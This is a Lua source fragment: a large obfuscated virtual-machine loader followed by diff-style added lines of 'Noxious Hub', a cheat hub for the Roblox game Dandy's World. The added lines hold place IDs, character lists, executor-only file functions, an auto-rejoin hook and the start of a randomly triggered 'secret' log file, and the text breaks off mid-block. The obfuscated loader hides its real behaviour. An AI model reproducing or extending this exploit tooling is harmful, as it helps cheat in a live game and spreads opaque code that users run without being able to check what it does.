c=e[t]d[c]=d[c](d[c+1])n=n+1;e=p[n];break;end;d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;else c=e[t]d[c]=d[c](d[c+1])n=n+1;e=p[n];end else if f==5 then d[e[t]]=#d[e[l]];n=n+1;e=p[n];else if(d[e[t]]==e[r])then n=n+1;else n=e[l];end;end end else if f<1 then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];else if-1<=f then for c=34,74 do if 1<f then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;else d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];end end end end break;end;local c,u,h,o,s,f,_,k,b;for f=0,6 do if f>2 then if f>4 then if 2~=f then for r=16,58 do if f~=5 then _=e[t];k=d[_]b=d[_+2];if(b>0)then if(k>d[_+1])then n=e[l];else d[_+3]=k;end elseif(k<d[_+1])then n=e[l];else d[_+3]=k;end break;end;f=0;while f>-1 do if 3<=f then if f<=4 then if 1<=f then repeat if f<4 then o=c[h];break;end;s=c[u];until true;else o=c[h];end else if f<6 then d(s,o);else f=-2;end end else if f>=1 then if-3~=f then repeat if f~=2 then u=t;break;end;h=l;until true;else h=l;end else c=e;end end f=f+1 end n=n+1;e=p[n];break;end;else f=0;while f>-1 do if 3<=f then if f<=4 then if 1<=f then repeat if f<4 then o=c[h];break;end;s=c[u];until true;else o=c[h];end else if f<6 then d(s,o);else f=-2;end end else if f>=1 then if-3~=f then repeat if f~=2 then u=t;break;end;h=l;until true;else h=l;end else c=e;end end f=f+1 end n=n+1;e=p[n];end else if 3==f then f=0;while f>-1 do if 3>f then if f<=0 then c=e;else if 1==f then u=t;else h=l;end end else if f>4 then if f~=6 then d(s,o);else f=-2;end else if f~=1 then for e=13,78 do if 4~=f then o=c[h];break;end;s=c[u];break;end;else o=c[h];end end end f=f+1 end n=n+1;e=p[n];else f=0;while f>-1 do if f>=3 then if f<=4 then if f~=-1 then repeat if 4>f then o=c[h];break;end;s=c[u];until true;else s=c[u];end else if 2<f then repeat if f<6 then d(s,o);break;end;f=-2;until true;else d(s,o);end end else if f<=0 then c=e;else if f==1 then u=t;else h=l;end end end f=f+1 end n=n+1;e=p[n];end end else if 1>f then d[e[t]]=a[e[l]];n=n+1;e=p[n];else if f>0 then repeat if f<2 then d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];break;end;d[e[t]]={};n=n+1;e=p[n];until true;else d[e[t]]={};n=n+1;e=p[n];end end end end until true;else local c;for f=0,6 do if 3<=f then if f<5 then if f>=1 then for h=43,59 do if 4>f then c=e[t]d[c]=d[c](d[c+1])n=n+1;e=p[n];break;end;d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;else c=e[t]d[c]=d[c](d[c+1])n=n+1;e=p[n];end else if f==5 then d[e[t]]=#d[e[l]];n=n+1;e=p[n];else if(d[e[t]]==e[r])then n=n+1;else n=e[l];end;end end else if f<1 then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];else if-1<=f then for c=34,74 do if 1<f then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;else d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];end end end end end end else if 157<f then for n=25,91 do if 160~=f then local e=e[t]d[e]=d[e](d[e+1])break;end;local e=e[t]d[e]=d[e]()break;end;else local e=e[t]d[e]=d[e](d[e+1])end end else if 168<=f then if 169>f then d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];d[e[t]]=d[e[l]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];do return end;else if f>167 then for c=46,65 do if 169<f then n=e[l];break;end;local s,h,a,f,o,c;d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];d[e[t]][d[e[l]]]=d[e[r]];n=n+1;e=p[n];do return d[e[t]]end n=n+1;e=p[n];s=e[t];h={};for e=1,#u do a=u[e];for e=0,#a do f=a[e];o=f[1];c=f[2];if o==d and c>=s then h[c]=o[c];f[1]=h;end;end;end;break;end;else n=e[l];end end else if f<=165 then if(e[t]<d[e[r]])then n=e[l];else n=n+1;end;else if f~=167 then d[e[t]]=d[e[l]]+d[e[r]];else d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];d[e[t]]=d[e[l]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];do return end;end end end end end end else if 105>=f then if f>=95 then if 100>f then if f<97 then if 93<=f then repeat if f<96 then d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];d[e[t]]=d[e[l]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];do return end;break;end;local f,c,h;for r=0,2 do if r<=0 then d[e[t]]=#d[e[l]];n=n+1;e=p[n];else if-1~=r then for a=39,63 do if 1~=r then f=e[t];c=d[f]h=d[f+2];if(h>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end break;end;d(e[t],e[l]);n=n+1;e=p[n];break;end;else d(e[t],e[l]);n=n+1;e=p[n];end end end until true;else d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];d[e[t]]=d[e[l]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];do return end;end else if 97<f then if 95<=f then repeat if 98<f then d[e[t]]=(e[l]~=0);break;end;local c;for f=0,3 do if 1>=f then if 1>f then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];else d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];end else if-2<=f then repeat if 3~=f then c=e[t]d[c]=d[c](h(d,c+1,e[l]))n=n+1;e=p[n];break;end;if d[e[t]]then n=n+1;else n=e[l];end;until true;else if d[e[t]]then n=n+1;else n=e[l];end;end end end until true;else local f;for c=0,3 do if 1>=c then if 1>c then d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];else d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];end else if-2<=c then repeat if 3~=c then f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];break;end;if d[e[t]]then n=n+1;else n=e[l];end;until true;else if d[e[t]]then n=n+1;else n=e[l];end;end end end end else local e=e[t]local t,n=k(d[e](d[e+1]))s=n+e-1 local n=0;for e=e,s do n=n+1;d[e]=t[n];end;end end else if 103>f then if 100>=f then local c,h,r,l,a,f;for o=0,1 do if-2<=o then for s=21,96 do if 1~=o then c=e[t]d[c](d[c+1])n=n+1;e=p[n];break;end;c=e[t];h={};for e=1,#u do r=u[e];for e=0,#r do l=r[e];a=l[1];f=l[2];if a==d and f>=c then h[f]=a[f];l[1]=h;end;end;end;break;end;else c=e[t];h={};for e=1,#u do r=u[e];for e=0,#r do l=r[e];a=l[1];f=l[2];if a==d and f>=c then h[f]=a[f];l[1]=h;end;end;end;end end else if 102~=f then d[e[t]][d[e[l]]]=d[e[r]];else for f=0,6 do if 2>=f then if 1<=f then if f>-2 then repeat if 2>f then d[e[t]]={};n=n+1;e=p[n];break;end;d[e[t]]={};n=n+1;e=p[n];until true;else d[e[t]]={};n=n+1;e=p[n];end else d[e[t]]={};n=n+1;e=p[n];end else if 5>f then if f~=-1 then for c=39,92 do if f~=3 then d(e[t],e[l]);n=n+1;e=p[n];break;end;d(e[t],e[l]);n=n+1;e=p[n];break;end;else d(e[t],e[l]);n=n+1;e=p[n];end else if 2~=f then for c=27,74 do if 6~=f then d(e[t],e[l]);n=n+1;e=p[n];break;end;d(e[t],e[l]);break;end;else d(e[t],e[l]);end end end end end end else if f<104 then local a,o,s,f,h,c,p;local n=0;while n>-1 do if 2<n then if n<=4 then if n~=4 then c=f[a];else p=d[h];for e=1+h,f[s]do p=p..d[e];end;end else if 4~=n then repeat if 6~=n then d[c]=p;break;end;n=-2;until true;else d[c]=p;end end else if 1<=n then if n==1 then f=e;else h=f[o];end else a=t;o=l;s=r;end end n=n+1 end else if f>=103 then repeat if f~=104 then local n=e[t]d[n]=d[n](h(d,n+1,e[l]))break;end;for f=0,6 do if 2<f then if f<=4 then if 4~=f then d(e[t],e[l]);n=n+1;e=p[n];else d(e[t],e[l]);n=n+1;e=p[n];end else if f~=1 then for c=20,97 do if 5<f then d(e[t],e[l]);break;end;d(e[t],e[l]);n=n+1;e=p[n];break;end;else d(e[t],e[l]);n=n+1;e=p[n];end end else if 1>f then d[e[t]]={};n=n+1;e=p[n];else if f~=-3 then repeat if f~=1 then d[e[t]]=d[e[l]];n=n+1;e=p[n];break;end;d(e[t],e[l]);n=n+1;e=p[n];until true;else d(e[t],e[l]);n=n+1;e=p[n];end end end end until true;else local n=e[t]d[n]=d[n](h(d,n+1,e[l]))end end end end else if f>=90 then if 91<f then if 92>=f then local t=e[t];local n=d[e[l]];d[t+1]=n;d[t]=n[e[r]];else if f>90 then repeat if 93<f then d[e[t]]=a[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];d[e[t]]={};break;end;d[e[t]]=d[e[l]]%d[e[r]];until true;else d[e[t]]=a[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];d[e[t]]={};end end else if f<91 then local f,c,r;for h=0,2 do if 0>=h then d[e[t]]=#d[e[l]];n=n+1;e=p[n];else if 1<h then f=e[t];c=d[f]r=d[f+2];if(r>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end else d(e[t],e[l]);n=n+1;e=p[n];end end end else local f,r,o,c;f=e[t]d[f]=d[f](d[f+1])n=n+1;e=p[n];f=e[t]d[f]=d[f]()n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d[e[t]]=a[e[l]];n=n+1;e=p[n];f=e[t]r,o=k(d[f](h(d,f+1,e[l])))s=o+f-1 c=0;for e=f,s do c=c+1;d[e]=r[c];end;n=n+1;e=p[n];f=e[t]d[f]=d[f](h(d,f+1,s))end end else if f<87 then if 86~=f then for f=0,6 do if 2>=f then if f<=0 then d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];else if f>0 then for c=35,91 do if f>1 then d[e[t]]=a[e[l]];n=n+1;e=p[n];break;end;a[e[l]]=d[e[t]];n=n+1;e=p[n];break;end;else a[e[l]]=d[e[t]];n=n+1;e=p[n];end end else if f>=5 then if f>=2 then repeat if 6~=f then d[e[t]]=(e[l]~=0);n=n+1;e=p[n];break;end;a[e[l]]=d[e[t]];until true;else d[e[t]]=(e[l]~=0);n=n+1;e=p[n];end else if 1<=f then repeat if f<4 then d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];break;end;a[e[l]]=d[e[t]];n=n+1;e=p[n];until true;else a[e[l]]=d[e[t]];n=n+1;e=p[n];end end end end else local f,c,h;for r=0,2 do if r<1 then d(e[t],e[l]);n=n+1;e=p[n];else if r>0 then for a=27,68 do if 2~=r then d(e[t],e[l]);n=n+1;e=p[n];break;end;f=e[t];c=d[f]h=d[f+2];if(h>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end break;end;else d(e[t],e[l]);n=n+1;e=p[n];end end end end else if f>=88 then if f>=87 then for n=48,81 do if 88~=f then d[e[t]]=d[e[l]][d[e[r]]];break;end;d[e[t]][e[l]]=d[e[r]];break;end;else d[e[t]]=d[e[l]][d[e[r]]];end else local f,c,r;for h=0,2 do if 0<h then if-2<h then repeat if 2~=h then d(e[t],e[l]);n=n+1;e=p[n];break;end;f=e[t];c=d[f]r=d[f+2];if(r>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end until true;else f=e[t];c=d[f]r=d[f+2];if(r>0)then if(c>d[f+1])then n=e[l];else d[f+3]=c;end elseif(c<d[f+1])then n=e[l];else d[f+3]=c;end end else d[e[t]]=#d[e[l]];n=n+1;e=p[n];end end end end end end else if 116>=f then if f>110 then if f>113 then if f<115 then local f,_,o,c,a,r;f=e[t];do return d[f](h(d,f+1,e[l]))end;n=n+1;e=p[n];f=e[t];do return h(d,f,s)end;n=n+1;e=p[n];f=e[t];_={};for e=1,#u do o=u[e];for e=0,#o do c=o[e];a=c[1];r=c[2];if a==d and r>=f then _[r]=a[r];c[1]=_;end;end;end;else if 116==f then d[e[t]]=b(y[e[l]],nil,a);else local c,f;d[e[t]]=#d[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]]%d[e[r]];n=n+1;e=p[n];d[e[t]]=d[e[l]]+e[r];n=n+1;e=p[n];d[e[t]]=o[e[l]];n=n+1;e=p[n];c=e[t];f=d[e[l]];d[c+1]=f;d[c]=f[e[r]];n=n+1;e=p[n];d[e[t]]=d[e[l]];n=n+1;e=p[n];d[e[t]]=d[e[l]];end end else if f>111 then if 112==f then for f=0,1 do if f>=-3 then for c=45,73 do if 0<f then d[e[t]]=a[e[l]];break;end;d(e[t],e[l]);n=n+1;e=p[n];break;end;else d(e[t],e[l]);n=n+1;e=p[n];end end else if d[e[t]]then n=n+1;else n=e[l];end;end else local e=e[t];s=e+z-1;for n=e,s do local e=g[n-e];d[n]=e;end;end end else if f<108 then if f>=103 then repeat if 107~=f then local r,u,c,o,s,f,h;f=0;while f>-1 do if 2<f then if 5<=f then if 6==f then f=-2;else d(s,o);end else if 3~=f then s=r[u];else o=r[c];end end else if 1>f then r=e;else if-2~=f then repeat if 2~=f then u=t;break;end;c=l;until true;else c=l;end end end f=f+1 end n=n+1;e=p[n];h=e[t]d[h](d[h+1])n=n+1;e=p[n];d[e[t]]=a[e[l]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];do return end;n=n+1;e=p[n];for e=e[t],e[l]do d[e]=nil;end;break;end;local c;for f=0,6 do if 2<f then if 5<=f then if f==5 then d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];else d[e[t]]=a[e[l]];end else if 2~=f then repeat if f~=3 then d[e[t]]=a[e[l]];n=n+1;e=p[n];break;end;d[e[t]]=d[e[l]][e[r]];n=n+1;e=p[n];until true;else d[e[t]]=a[e[l]];n=n+1;e=p[n];end end else if 0<f then if f>=-3 then for c=15,84 do if 1~=f then d[e[t]]=a[e[l]];n=n+1;e=p[n];break;end;d[e[t]]=a[e[l]];n=n+1;e=p[n];break;end;else d[e[t]]=a[e[l]];n=n+1;e=p[n];end else c=e[t]d[c](d[c+1])n=n+1;e=p[n];end end end until true;else local h,s,r,o,u,f,c;f=0;while f>-1 do if 2<f then if 5<=f then if 6==f then f=-2;else d(u,o);end else if 3~=f then u=h[s];else o=h[r];end end else if 1>f then h=e;else if-2~=f then repeat if 2~=f then s=t;break;end;r=l;until true;else r=l;end end end f=f+1 end n=n+1;e=p[n];c=e[t]d[c](d[c+1])n=n+1;e=p[n];d[e[t]]=a[e[l]];n=n+1;e=p[n];d[e[t]]();n=n+1;e=p[n];do return end;n=n+1;e=p[n];for e=e[t],e[l]do d[e]=nil;end;end else if f>108 then if f>108 then repeat if 109~=f then d[e[t]]=#d[e[l]];break;end;local f;d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];d[e[t]]=d[e[l]];until true;else d[e[t]]=#d[e[l]];end else local n=e[t];local t=d[n];for e=n+1,e[l]do c.OszS_ida(t,d[e])end;end end end else if 122>f then if 119<=f then if f<=119 then d[e[t]]=o[e[l]];else if f>119 then repeat if 121~=f then local a,o,s,p,h,c,f;local n=0;while n>-1 do if n<=2 then if 0>=n then a=t;o=l;s=r;else if n>=-1 then repeat if n<2 then p=e;break;end;h=p[o];until true;else h=p[o];end end else if n<5 then if 0~=n then for e=31,89 do if n~=4 then c=p[a];break;end;f=d[h];for e=1+h,p[s]do f=f..d[e];end;break;end;else c=p[a];end else if 4<n then for e=47,90 do if n>5 then n=-2;break;end;d[c]=f;break;end;else d[c]=f;end end end n=n+1 end break;end;local f;d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];d(e[t],e[l]);n=n+1;e=p[n];f=e[t]d[f]=d[f](h(d,f+1,e[l]))n=n+1;e=p[n];d[e[t]]=d[e[l]];until true;else local a,o,s,p,c,h,f;local n=0;while n>-1 do if n<=2 then if 0>=n then a=t;o=l;s=r;else if n>=-1 then repeat if n<2 then p=e;break;end;c=p[o];until true;else c=p[o];end end else if n<5 then if 0~=n then for e=31,89 do if n~=4 then h=p[a];break;end;f=d[c];for e=1+c,p[s]do f=f..d[e];end;break;end;else h=p[a];end else if 4<n then for e=47,90 do if n>5 then n=-2;break;end;d[h]=f;break;end;else d[h]=f;end end end n=n+1 end end end else if 115<=f then for c=11,79 do if 118~=f then d[e[t]]={};break;end;for f=0,1 do if-4<f then for c=19,91 do if 0<f then if(d[e[t]]==d[e[r]])then n=n+1;else n=e[l];end;break;end;d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];break;end;else d[e[t]]=d[e[l]][d[e[r]]];n=n+1;e=p[n];end end break;end;else d[e[t]]={};end end else if f>124 then if f<=125 then d[e[t]]=d[e[l]]-e[r];else if 123<f then repeat if 127~=f then local n=e[t];do return d[n](h(d,n+1,e[l]))end;break;end;local p=d[e[r]];if not p then n=n+1;else d[e[t]]=p;n=e[l];end;until true;else local n=e[t];do return d[n](h(d,n+1,e[l]))end;end end else if 122<f then if f==123 then local p,r,c,h,f;local n=0;while n>-1 do if n<3 then if 1<=n then if n>=-3 then for e=38,94 do if n<2 then r=t;break;end;c=l;break;end;else c=l;end else p=e;end else if n<=4 then if-1<n then repeat if 3<n then f=p[r];break;end;h=p[c];until true;else f=p[r];end else if 3<n then repeat if 5~=n then n=-2;break;end;d(f,h);until true;else n=-2;end end end n=n+1 end else local y,a,o,s,y,f,u,c,_,g,b,k,r;f=0;while f>-1 do if f>=3 then if 4>=f then if f~=1 then repeat if 3~=f then r=c[a];break;end;s=c[o];until true;else r=c[a];end else if 6>f then d(r,s);else f=-2;end end else if 1<=f then if f~=0 then repeat if 1~=f then o=l;break;end;a=t;until true;else a=t;end else c=e;end end f=f+1 end n=n+1;e=p[n];f=0;while f>-1 do if f>=3 then if f>=5 then if 5==f then d(r,s);else f=-2;end else if 3~=f then r=c[a];else s=c[o];end end else if 0>=f then c=e;else if-1<=f then repeat if 1<f then o=l;break;end;a=t;until true;else o=l;end end end f=f+1 end n=n+1;e=p[n];f=0;while f>-1 do if f<3 then if 0<f then if f~=-3 then repeat if f>1 then o=l;break;end;a=t;until true;else a=t;end else c=e;end else if 5>f then if 3~=f then r=c[a];else s=c[o];end else if 6==f then f=-2;else d(r,s);end end end f=f+1 end n=n+1;e=p[n];u=e[t]d[u]=d[u](h(d,u+1,e[l]))n=n+1;e=p[n];f=0;while f>-1 do if 3<f then if f>5 then if 5<f then repeat if f~=6 then f=-2;break;end;d[r]=k;until true;else f=-2;end else if 1<f then repeat if 4<f then r=c[_];break;end;k=b[c[g]];until true;else r=c[_];end end else if f<2 then if 1~=f then c=e;else _=t;end else if 3==f then b=d;else g=l;end end end f=f+1 end n=n+1;e=p[n];f=0;while f>-1 do if 3>f then if 1<=f then if f==1 then a=t;else o=l;end else c=e;end else if 4<f then if f==5 then d(r,s);else f=-2;end else if 4==f then r=c[a];else s=c[o];end end end f=f+1 end n=n+1;e=p[n];f=0;while f>-1 do if f>2 then if 4>=f then if-1<=f then repeat if 3<f then r=c[a];break;end;s=c[o];until true;else s=c[o];end else if 3<=f then repeat if f~=6 then d(r,s);break;end;f=-2;until true;else f=-2;end end else if f>0 then if f~=-3 then for e=17,62 do if f~=2 then a=t;break;end;o=l;break;end;else o=l;end else c=e;end end f=f+1 end end else local f;for c=0,1 do if-2~=c then for r=26,86 do if c~=0 then if not d[e[t]]then n=n+1;else n=e[l];end;break;end;f=e[t]d[f]=d[f]()n=n+1;e=p[n];break;end;else if not d[e[t]]then n=n+1;else n=e[l];end;end end end end end end end end end n=1+n;end;end;return te end;local t=0xff;local p={};local f=(1);local l='';(function(n)local d=n local r=0x00 local e=0x00 d={(function(t)if r>0x28 then return t end r=r+1 e=(e+0x4be-t)%0x29 return(e%0x03==0x1 and(function(d)if not n[d]then e=e+0x01 n[d]=(0xaa);end return true end)'XAcJx'and d[0x1](0x2da+t))or(e%0x03==0x0 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x5c);end return true end)'cFzQW'and d[0x3](t+0x37f))or(e%0x03==0x2 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x7c);end return true end)'LUgjy'and d[0x2](t+0x3de))or t end),(function(p)if r>0x30 then return p end r=r+1 e=(e+0x858-p)%0x15 return(e%0x03==0x0 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x61);end return true end)'jtxGx'and d[0x1](0x16a+p))or(e%0x03==0x2 and(function(d)if not n[d]then e=e+0x01 n[d]=(0xae);end return true end)'kVdOv'and d[0x2](p+0xf2))or(e%0x03==0x1 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x65);l='\37';t={function()t()end};l=l..'\100\43';end return true end)'gQVBC'and d[0x3](p+0x1cf))or p end),(function(a)if r>0x2e then return a end r=r+1 e=(e+0xbda-a)%0x48 return(e%0x03==0x2 and(function(d)if not n[d]then e=e+0x01 n[d]=(0xcf);p[f]=pe();f=f+t;end return true end)'zORby'and d[0x1](0x145+a))or(e%0x03==0x1 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x25);t[2]=(t[2]*(ne(function()p()end,h(l))-ne(t[1],h(l))))+1;p[f]={};t=t[2];f=f+t;end return true end)'tshAL'and d[0x3](a+0x1e6))or(e%0x03==0x0 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x50);l={l..'\58 a',l};p[f]=te();f=f+((not c.fggXJ__n)and 1 or 0);l[1]='\58'..l[1];t[2]=0xff;end return true end)'sopLp'and d[0x2](a+0x1cb))or a end)}d[0x2](0x1aba)end){};local e=b(h(p));p[2]={};p[1]=e(p[1])sV_kkXaVaytDTXf=nil;e=b(h(p))return e(...);end return le((function()local n={}local e=0x01;local d;if c.fggXJ__n then d=c.fggXJ__n(le)else d=''end if c.KBAKdkEE(d,c.bHQkEbMm)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(d,e,n,l,t,p)local p;if d<4 then if 1>=d then if d~=0 then do return function(d,e,n)if n then local e=(d/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(d%(e+e)>=e)and 1 or 0;end;end;end;else do return e(1),e(4,t,l,n,e),e(5,t,l,n)end;end else if d>=0 then for p=23,83 do if d~=3 then do return 16777216,65536,256 end;break;end;do return e(1),e(4,t,l,n,e),e(5,t,l,n)end;break;end;else do return e(1),e(4,t,l,n,e),e(5,t,l,n)end;end end else if 5>=d then if 4==d then local d=l;local p,f,l=t(2);do return function()local e,n,t,c=e(n,d(d,d),d(d,d)+3);d(4);return(c*p)+(t*f)+(n*l)+e;end;end;else local d=l;do return function()local e=e(n,d(d,d),d(d,d));d(1);return e;end;end;end else if 7<=d then if d>=5 then for e=34,59 do if 8>d then do return setmetatable({},{['__\99\97\108\108']=function(e,t,l,d,n)if n then return e[n]elseif d then return e else e[t]=l end end})end break;end;do return n(d,nil,n);end break;end;else do return setmetatable({},{['__\99\97\108\108']=function(e,d,t,l,n)if n then return e[n]elseif l then return e else e[d]=t end end})end end else do return t[n]end;end end end end),...)
+if _G.dswdnoxiousloaded == true then return end _G.dswdnoxiousloaded = true
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+if not game:IsLoaded() then game["Loaded"]:Wait() end local noxious = {} noxious["testing"] = false
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["version"] = "7.8.7"
+noxious["uses"] = "693.2K"
+noxious["debug mode"] = false
+
+noxious["dandy's world lobby"] = 16116270224
+noxious["dandy's world run"] = 16552821455
+noxious["dandy's world roleplay server"] = 18984416148
+noxious["in studio"] = game["Run Service"]:IsStudio()
+
+noxious["loaded"] = false
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["click sound"] = "rbxassetid://87152549167464"
+
+function playclicksound() local s = Instance.new("Sound") s["SoundId"] = noxious["click sound"] s["Parent"] = game["Workspace"] s["Volume"] = 1.2 s["TimePosition"] = 0.1 s:Play() end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["toons"] = { "Blott", "Flyte", "Yatta", "Bassie", "Cocoa", "Eggson", "Bobette", "Coal", "Rudie", "Ginger", "Boxten", "Rudie", "Brightney", "Cosmo", "Connie", "Finn", "Flutter", "Gigi", "Glisten", "Goob", "Poppy", "RazzleDazzle", "Rodger", "Scraps", "Shrimpo", "Teagan", "Tisha", "Toodles", "Sprout", "Vee", "Dandy", "Shelly", "Pebble", "Astro", "Dandy", "Looey" }
+noxious["toons with old animation rigs"] = { "Boxten", "Brightney", "Cosmo", "Finn", "Flutter", "Gigi", "Glisten", "Goob", "Poppy", "Rodger", "Scraps", "Shrimpo", "Teagan", "Tisha", "Toodles", "Astro", "Shelly", "Sprout", "Dandy", }
+
+--[[
+removetoons = {}
+for _, item in ipairs(noxious["toons with old animation rigs"]) do
+	removetoons[item] = true
+end
+
+toonresult = {}
+for _, item in ipairs(noxious["toons"]) do
+	if not removetoons[item] then
+		table.insert(toonresult, item)
+	end
+end
+]]--
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function randomstring(l)
+	local characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	local result = ""
+	for i = 1, l do
+		local randomIndex = math.random(1, #characters)
+		result = result .. string.sub(characters, randomIndex, randomIndex)
+	end
+	return result
+end
+
+function randomstring2(l) 
+	local chars = {"▓", "▒", "░"}
+	local result = ""
+	for i = 1, l do
+		local rndi = math.random(1, #chars)
+		result = result .. chars[rndi]
+	end
+	return result 
+end
+
+function ndebug(txt)
+	if noxious["debug mode"] then
+		print("[DEBUG] [Noxious Hub]: " .. txt)
+	end
+end
+
+function tofolder()
+	if noxious["in studio"] then return end
+
+	local a = "Noxious Hub"
+	local b = a .. "/Dandy's World"
+
+	if not isfolder(a) then makefolder(a) end
+	if not isfolder(b) then makefolder(b) end
+
+	return b
+end
+
+function tologs()
+	if noxious["in studio"] then return end
+
+	local a = "Noxious Hub"
+	local b = a .. "/Dandy's World"
+	local c = b .. "/Secret"
+
+	if not isfolder(a) then makefolder(a) end
+	if not isfolder(b) then makefolder(b) end
+	if not isfolder(c) then makefolder(c) end
+
+	return c
+end
+
+function isaprilfools()
+	local d = os.date("*t")
+	return (d.month == 4 and d.day == 1) or noxious["april fools"] or false
+end
+
+noxious["prefixes"] = { "Reversed", "Skeptical", "Bright", "Sweet", "Fish", "Mute", "Kleptomaniac", "Perfectionist", "Enthusiastic", "Addicted", "Investigative", "Crafty", "Angry", "Minimalistic", "Clean", "Insane", "Quiet", "Worried", "Drunk", "Small", "Ignored", "Protective", "Smart", "Clueless", "Old", "Flying", "Large", "Edible", "Glowing", "Concerned" }
+noxious["suffixes"] = { "Ink", "Box", "Lamp", "Ghost", "Cake", "Bowl", "Butterfly", "Gachapon", "Mirror", "Fluff", "Balloon", "Bubble", "Mask", "Glass", "Paper", "Shrimp", "Teacup", "Tissue", "Pinata", "Moon", "Basket", "Ornament", "Rock", "Shell", "Berry", "Television", "Bunny", "Egg", "Moth", "Mineral", "Cookie", "Reindeer", "Flower" }
+
+function randomname()
+	local prefix = noxious["prefixes"][math.random(1, #noxious["prefixes"])]
+	local suffix = noxious["suffixes"][math.random(1, #noxious["suffixes"])]
+	return prefix .. suffix
+end
+
+noxious["randomized name"] = randomname()
+
+function autorejoin()
+	game["GuiService"].ErrorMessageChanged:Connect(function()
+		execcmd("jl")
+	end)
+end
+
+function owoify(text)
+	local substitutions = {
+		["r"] = "w",
+		["l"] = "w",
+		["R"] = "W",
+		["L"] = "W",
+		["no"] = "nyo",
+		["No"] = "Nyo",
+		["mo"] = "myo",
+		["na"] = "nya",
+		["ove"] = "uv",
+		["th"] = "d",
+	}
+
+	for k, v in pairs(substitutions) do
+		text = text:gsub(k, v)
+	end
+
+	local suffixes = { " owo", " UwU", " >w<", " ^w^", " rawr~", " nya~" }
+	if math.random() < 0.5 then
+		text = text .. suffixes[math.random(1, #suffixes)]
+	end
+
+	return text
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+if not noxious["in studio"] then
+	if math.random() < 0.01 then
+		noxious["secret filepath"] = tologs()
+		noxious["secret file"] = noxious["secret filepath"] .. "/" .. noxious["randomized name"] .. ".txt"
